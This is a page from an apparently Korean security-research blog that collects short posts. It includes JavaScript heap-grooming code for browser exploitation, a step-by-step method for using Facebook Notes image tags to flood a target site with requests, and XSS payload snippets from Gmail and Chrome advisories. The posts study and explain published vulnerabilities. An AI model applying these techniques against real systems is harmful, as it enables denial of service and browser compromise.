+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">plunger</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// This function flushes out all blocks in the cache and leaves it empty</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">flushCache</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// Free all blocks in the plunger array to push all smaller blocks out</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nx">plunger</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+</span><span class='line'>    <span class="nx">CollectGarbage</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// Allocate 6 maximum size blocks from each bin and leave the cache empty</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nx">plunger</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nx">plunger</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">alloc</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
+</span><span class='line'>        <span class="nx">plunger</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">alloc</span><span class="p">(</span><span class="mi">64</span><span class="p">));</span>
+</span><span class='line'>        <span class="nx">plunger</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">alloc</span><span class="p">(</span><span class="mi">256</span><span class="p">));</span>
+</span><span class='line'>        <span class="nx">plunger</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">alloc</span><span class="p">(</span><span class="mi">32768</span><span class="p">));</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">flushCache</span><span class="p">();</span> <span class="c1">// Flush the cache before doing any allocations</span>
+</span><span class='line'><span class="nx">alloc_str</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span> <span class="c1">// Allocate the string</span>
+</span><span class='line'><span class="nx">free_str</span><span class="p">();</span> <span class="c1">// Free the string and flush the cache</span>
+</span><span class='line'><span class="nx">flushCache</span><span class="p">();</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Bibliography</h3>
+
+<ul>
+<li><a href="http://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Marinescu.pdf">Windows Vista Heap Management Enhancements by Adrian Marinescu</a></li>
+<li><a href="http://www.blackhat.com/presentations/win-usa-02/halvarflake-winsec02.ppt">Third Generation Exploitation by Halvar Flake</a></li>
+<li><a href="http://www.blackhat.com/presentations/win-usa-04/bh-win-04-litchfield/bh-win-04-litchfield.ppt">Windows Heap Overflows by David Litchfield</a></li>
+<li><a href="http://www.cybertech.net/~sh0ksh0k/projects/winheap/XPSP2%20Heap%20Exploitation.ppt">XP SP2 Heap Exploitation by Matt Conover</a></li>
+<li><a href="http://packetstormsecurity.nl/papers/bypass/bypassing-win-heap-protections.pdf">Bypassing Windows heap protections by Nicolas Falliere</a></li>
+<li><a href="http://www.maxpatrol.com/defeating-xpsp2-heap-protection.pdf">Defeating Microsoft Windows XP SP2 Heap Protection and DEP bypass by Alexander Anisimov</a></li>
+<li><a href="http://www.security-assessment.com/Whitepapers/Exploiting_Freelist[0]_On_XPSP2.zip">Exploiting Freelist[0] on XP SP2 by Brett Moore</a></li>
+<li><a href="http://blogs.msdn.com/ericlippert/archive/2003/09/17/53038.aspx">How Do The Script Garbage Collectors Work? by Eric Lippert</a></li>
+<li><a href="http://www.edup.tudelft.nl/~bjwever/advisory_iframe.html.php">Internet Explorer IFRAME exploit by SkyLined</a></li>
+<li><a href="http://metasploit.com/projects/Framework/exploits.html#ie_webview_setslice">ie_webview_setslice exploit by H D Moore</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/04/28/using-facebook-notes-to-ddos-any-website/">Using Facebook Notes to DDoS Any Website</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-04-28T08:43:15+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>8:43 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://chr13.com/2014/04/20/using-facebook-notes-to-ddos-any-website/">Using Facebook Notes to DDoS any website</a></p>
+
+<p>요약해본다.</p>
+
+<p>Step 1. Facebook Notes 는 <code>&lt;img&gt;</code> 태그를 받아준다. 원 소스에서 가져다가 캐쉬하는데, 파라메터를 쓰면 caching 을 바이패스할 수 있다.</p>
+
+<pre><code>&lt;img src=http://targethost/file?=1&gt;&lt;/img&gt;
+&lt;img src=http://targethost/file?=2&gt;&lt;/img&gt;
+&lt;img src=http://targethost/file?=3&gt;&lt;/img&gt;
+&lt;img src=http://targethost/file?=4&gt;&lt;/img&gt;
+...
+&lt;img src=http://targethost/file?=1000&gt;&lt;/img&gt;
+</code></pre>
+
+<p>Step 2. 이제 m.facebook.com 을 사용해 <code>note</code> 를 만든다. 900 언저리에서 사이즈 제한으로 짤릴 것이다.</p>
+
+<p>Step 3. 동일한 내용으로 <code>note</code> 를 십여개 만든다. 이제 글 하나당 약 900 ~ 1000 개의 http request 공격이 된다.</p>
+
+<p>Step 4. 이 <code>note</code> 들을 한꺼번에 본다. 타겟 서버는 9000 (900 x 10) 개의 http request 을 받게 된다.</p>
+
+<p>많은 DDoS trick 의 요체는 input size v.s. output size 의 비대칭이다.
+내가 가진 제한된 upstream bandwidth 에 비해 대단히 비대칭적인 size 의 output packet 을 만들어낼 수 있냐가 핵심이다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/04/25/android-paranoid-network/">ANDROID_PARANOID_NETWORK</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-04-25T12:35:34+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:35 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>bootloader loads kernel
+-&gt; kernel
+-&gt; init process
+-&gt; init spawns daemons (i.e. adbd)
+-&gt; init launches zygote
+-&gt; zygote launches the first DVM and proloads all core classes
+-&gt; zygote forks itself and starts a process called system server
+-&gt; the system server then starts all core android services i.e. activity manager
+
+ANDROID_PARANOID_NETWORK
+/include/linux/android_aids.h
+AID_INET
+/system/core/include/private/android_filesystem_config.h
+/system/etc/permissions/platform.xml
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/04/24/dom-xss-on-google-plus-one-button/">DOM XSS on Google Plus One Button</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-04-24T20:54:04+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>8:54 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content">
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/04/23/bypassing-browser-memory-protections/">Bypassing Browser Memory Protections</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-04-23T10:18:48+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>10:18 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://www.cs.berkeley.edu/~dawnsong/teaching/f12-cs161/readings/bh08-sotirov-dowd.pdf">Bypassing Browser Memory Protections</a> 를 리뷰해보겠다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/04/23/gmail-xss-2012/">Gmail XSS - 2012</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-04-23T09:29:16+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>9:29 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Google 프로덕트에서 발견된 대표적인 XSS 취약점들을 리뷰해본다.</p>
+
+<h3><a href="http://www.benhayak.com/2012/06/google-mail-hacking-gmail-stored-xss.html">Google Mail Hacking - Gmail Stored XSS - 2012!</a></h3>
+
+<pre><code>// This Gmail Code was creating a Tool-tip that included 
+// profile circles information that comes from 
+// your Google Plus friend's account, 
+// if they used a payload, 
+// your mail account would have been at a serious risk.
+
+zk.prototype.Ca = function $pn(a,c,d) {
+    this.xa = 0;
+    if (!this.ea) {
+        // ...
+        var e = this.Bb.zb().body, g = this.ea.va();
+        // ...
+        e.wa = h
+    }
+    a: {
+        if (d)
+            switch (d.toLowerCase().split(",")[1]) {
+                case "l":
+                    break a;
+                case "r":
+                    // ...
+                    break a
+            }
+        e = 2;
+    }
+    this.wa.setPosition(cka(d),e,i,-1);
+    jc(this.ea.va(), "T-ays-avH");
+    ud(this.ea.va(), 0, 0);
+    this.ea.Mc().innerHTML = c; // c = Data from Google+
+    this.wa.To(a);
+    this.wa.Me(k, 0);
+};
+</code></pre>
+
+<p>정리하면 위 코드는 Google+ 친구의 프로파일 정보를 Tool-tip 의 innerHTML 에 장착한다. 결국 친구 프로파일을 보여주는 Tool-tip 이 뜨는 순간, 내 브라우저에 payload 가 실행될 수 있다는 것.</p>
+
+<h3><a href="http://blog.watchfire.com/files/google-chrome-advisory.doc">&ldquo;CHROMEHTML&rdquo; URI Vulnerability</a></h3>
+
+<pre><code>var sneaky = 'setTimeout("alert(document.cookie);", 4000);document.location.assign("http://www.gmail.com");';
+document.location = 'chromehtml:"80%20javascript:document.write(sneaky)"';
+</code></pre>
+
+<p>chromehtml: uri handler 를 통해서 javascript 을 수행시키고, setTimeout() 을 통해 SOP 를 바이패스한다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/15">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/13">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/stagefright/">Stagefright</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Your Name -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
